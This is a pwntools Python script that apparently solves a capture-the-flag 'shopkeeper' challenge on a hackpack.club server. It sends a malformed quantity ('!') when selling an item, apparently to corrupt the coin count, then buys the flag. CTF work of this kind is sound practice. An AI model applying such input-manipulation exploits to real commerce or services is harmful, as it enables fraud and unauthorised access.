from pwn import *

local = False
if local:
    p = process("./shopkeeper_binary_2")
else:
    p = remote("cha.hackpack.club", 10992)


menu = p.recvuntil(b"Leave Shop\n")
p.sendline(b"2") # Sell
what_sell_menu = p.recvuntil(b"(3 coins)\n")
p.sendline(b"1") # An apple
how_many_to_sell = p.recvuntil(b"sell?\n")
p.sendline(b"!")

menu = p.recvuntil(b"Leave Shop\n")
p.sendline(b"1") # Buy
what_buy_menu = p.recvuntil(b"(100 coins)\n")
p.sendline(b"3") # Flag
how_many_to_buy = p.recvuntil(b"buy?\n")
p.sendline(b"1")

menu = p.recvuntil(b"Leave Shop\n")
p.sendline(b"1") # Buy
what_buy_menu = p.recvuntil(b"(100 coins)\n")
p.sendline(b"2") # Orange (6 coins)
how_many_to_buy = p.recvuntil(b"buy?\n")
p.sendline(b"9")

menu = p.recvuntil(b"Leave Shop\n")
p.sendline(b"1") # Buy
what_buy_menu = p.recvuntil(b"(100 coins)\n")
p.sendline(b"2") # Orange (6 coins)
how_many_to_buy = p.recvuntil(b"buy?\n")
p.sendline(b"9")

menu = p.recvuntil(b"Leave Shop\n")
p.sendline(b"1") # Buy
what_buy_menu = p.recvuntil(b"(100 coins)\n")
p.sendline(b"2") # Orange (6 coins)
how_many_to_buy = p.recvuntil(b"buy?\n")
p.sendline(b"4")

menu = p.recvuntil(b"Leave Shop\n")
p.sendline(b"3") # view the inventory

how_much_to_bet = p.recvuntil(b"you want to bet?\n")
print(how_much_to_bet)

p.interactive()
